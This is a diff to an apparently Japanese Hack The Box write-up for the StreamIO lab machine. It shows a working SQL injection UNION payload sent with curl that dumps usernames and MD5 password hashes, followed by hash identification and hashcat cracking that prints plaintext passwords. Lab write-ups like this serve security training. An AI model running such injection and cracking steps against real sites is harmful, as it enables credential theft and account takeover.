@@ -246,36 +246,78 @@ usersテーブルの列名を確認
                 <h5 class="p-2">password</h5>
                 <h5 class="p-2">username</h5>
 ```
+クレデンシャルっぽいものを発見
 ```sh
-└─$ curl -d "q=testtest' union select '1',password,'3','4','5','6' from users--" -k -s https://watch.streamio.htb/search.php | grep '<h5'
-                <h5 class="p-2">0049ac57646627b8d7aeaccf8b6a936f                  </h5>
-                <h5 class="p-2">08344b85b329d7efd611b7a7743e8a09                  </h5>
-                <h5 class="p-2">083ffae904143c4796e464dac33c1f7d                  </h5>
-                <h5 class="p-2">0cfaaaafb559f081df2befbe66686de0                  </h5>
-                <h5 class="p-2">1c2b3d8270321140e5153f6637d3ee53                  </h5>
-                <h5 class="p-2">22ee218331afd081b0dcd8115284bae3                  </h5>
-                <h5 class="p-2">2a4e2cf22dd8fcb45adcb91be1e22ae8                  </h5>
-                <h5 class="p-2">35394484d89fcfdb3c5e447fe749d213                  </h5>
-                <h5 class="p-2">3577c47eb1e12c8ba021611e1280753c                  </h5>
-                <h5 class="p-2">384463526d288edcc95fc3701e523bc7                  </h5>
-                <h5 class="p-2">3961548825e3e21df5646cafe11c6c76                  </h5>
-                <h5 class="p-2">54c88b2dbd7b1a84012fabc1a4c73415                  </h5>
-                <h5 class="p-2">665a50ac9eaa781e4f7f04199db97a11                  </h5>
-                <h5 class="p-2">6dcd87740abb64edfa36d170f0d5450d                  </h5>
-                <h5 class="p-2">7df45a9e3de3863807c026ba48e55fb3                  </h5>
-                <h5 class="p-2">8097cedd612cc37c29db152b6e9edbd3                  </h5>
-                <h5 class="p-2">925e5408ecb67aea449373d668b7359e                  </h5>
-                <h5 class="p-2">b22abb47a02b52d5dfa27fb0b534f693                  </h5>
-                <h5 class="p-2">b779ba15cedfd22a023c4d8bcf5f2332                  </h5>
-                <h5 class="p-2">b83439b16f844bd6ffe35c02fe21b3c0                  </h5>
-                <h5 class="p-2">bf55e15b119860a6e6b5a164377da719                  </h5>
-                <h5 class="p-2">c660060492d9edcaa8332d89c99c9239                  </h5>
-                <h5 class="p-2">d62be0dc82071bccc1322d64ec5b6c51                  </h5>
-                <h5 class="p-2">dc332fb5576e9631c9dae83f194f8e70                  </h5>
-                <h5 class="p-2">ec33265e5fc8c2f1b0c137bb7b3632b5                  </h5>
-                <h5 class="p-2">ee0b8a0937abd60c2882eacb2f8dc49f                  </h5>
-                <h5 class="p-2">ef8f3d30a856cf166fb8215aca93e9ff                  </h5>
-                <h5 class="p-2">f03b910e2bd0313a23fdd7575f34a694                  </h5>
-                <h5 class="p-2">f87d3c0d6c8fd686aacc6627f1f493a5                  </h5>
-                <h5 class="p-2">fd78db29173a5cf701bd69027cb9bf6b                  </h5>
+└─$ curl -d "q=testtest' union select '1',concat(username,password),'3','4','5','6' from users--" -k -s https://watch.streamio.htb/search.php | grep '<h5' > credentials.txt
+
+└─$ cat credentials.txt                                       
+                <h5 class="p-2">admin                                             665a50ac9eaa781e4f7f04199db97a11                  </h5>
+                <h5 class="p-2">Alexendra                                         1c2b3d8270321140e5153f6637d3ee53                  </h5>
+                <h5 class="p-2">Austin                                            0049ac57646627b8d7aeaccf8b6a936f                  </h5>
+                <h5 class="p-2">Barbra                                            3961548825e3e21df5646cafe11c6c76                  </h5>
+                <h5 class="p-2">Barry                                             54c88b2dbd7b1a84012fabc1a4c73415                  </h5>
+                <h5 class="p-2">Baxter                                            22ee218331afd081b0dcd8115284bae3                  </h5>
+                <h5 class="p-2">Bruno                                             2a4e2cf22dd8fcb45adcb91be1e22ae8                  </h5>
+                <h5 class="p-2">Carmon                                            35394484d89fcfdb3c5e447fe749d213                  </h5>
+                <h5 class="p-2">Clara                                             ef8f3d30a856cf166fb8215aca93e9ff                  </h5>
+                <h5 class="p-2">Diablo                                            ec33265e5fc8c2f1b0c137bb7b3632b5                  </h5>
+                <h5 class="p-2">Garfield                                          8097cedd612cc37c29db152b6e9edbd3                  </h5>
+                <h5 class="p-2">Gloria                                            0cfaaaafb559f081df2befbe66686de0                  </h5>
+                <h5 class="p-2">James                                             c660060492d9edcaa8332d89c99c9239                  </h5>
+                <h5 class="p-2">Juliette                                          6dcd87740abb64edfa36d170f0d5450d                  </h5>
+                <h5 class="p-2">Lauren                                            08344b85b329d7efd611b7a7743e8a09                  </h5>
+                <h5 class="p-2">Lenord                                            ee0b8a0937abd60c2882eacb2f8dc49f                  </h5>
+                <h5 class="p-2">Lucifer                                           7df45a9e3de3863807c026ba48e55fb3                  </h5>
+                <h5 class="p-2">Michelle                                          b83439b16f844bd6ffe35c02fe21b3c0                  </h5>
+                <h5 class="p-2">Oliver                                            fd78db29173a5cf701bd69027cb9bf6b                  </h5>
+                <h5 class="p-2">Robert                                            f03b910e2bd0313a23fdd7575f34a694                  </h5>
+                <h5 class="p-2">Robin                                             dc332fb5576e9631c9dae83f194f8e70                  </h5>
+                <h5 class="p-2">Sabrina                                           f87d3c0d6c8fd686aacc6627f1f493a5                  </h5>
+                <h5 class="p-2">Samantha                                          083ffae904143c4796e464dac33c1f7d                  </h5>
+                <h5 class="p-2">Stan                                              384463526d288edcc95fc3701e523bc7                  </h5>
+                <h5 class="p-2">Thane                                             3577c47eb1e12c8ba021611e1280753c                  </h5>
+                <h5 class="p-2">Theodore                                          925e5408ecb67aea449373d668b7359e                  </h5>
+                <h5 class="p-2">Victor                                            bf55e15b119860a6e6b5a164377da719                  </h5>
+                <h5 class="p-2">Victoria                                          b22abb47a02b52d5dfa27fb0b534f693                  </h5>
+                <h5 class="p-2">William                                           d62be0dc82071bccc1322d64ec5b6c51                  </h5>
+                <h5 class="p-2">yoshihide                                         b779ba15cedfd22a023c4d8bcf5f2332                  </h5>
+```
+パスワードの形式を確認、どうやらmd5っぽい
+```sh
+└─$ echo '665a50ac9eaa781e4f7f04199db97a11' > test.txt                            
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ name-that-hash -f test.txt --no-banner 
+
+665a50ac9eaa781e4f7f04199db97a11
+
+Most Likely 
+MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
+MD4, HC: 900 JtR: raw-md4
+NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
+Domain Cached Credentials, HC: 1100 JtR: mscach
+
+Least Likely
+Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  Tiger-128,  Skein-256(128),  Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 
+md5(md5(md5($pass))), HC: 3500 Summary: Hashcat mode is only supported in hashcat-legacy. md5(uppercase(md5($pass))), HC: 4300  md5(sha1($pass)), HC: 4400  
+md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR: dynamic_33 md5(md4($pass)), JtR: dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, JtR: ripemd-128 MD2, 
+JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt
+```
+クラックできた
+```sh
+└─$ cat credentials.txt | awk '{print $3}' > passwords.txt
+
+└─$ hashcat -a 0 -m 0 passwords.txt /usr/share/wordlists/rockyou.txt --quiet 
+3577c47eb1e12c8ba021611e1280753c:highschoolmusical
+ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
+665a50ac9eaa781e4f7f04199db97a11:paddpadd
+b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
+ef8f3d30a856cf166fb8215aca93e9ff:%$clara
+2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
+54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
+6dcd87740abb64edfa36d170f0d5450d:$3xybitch
+08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
+b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
+b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
+f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 ```
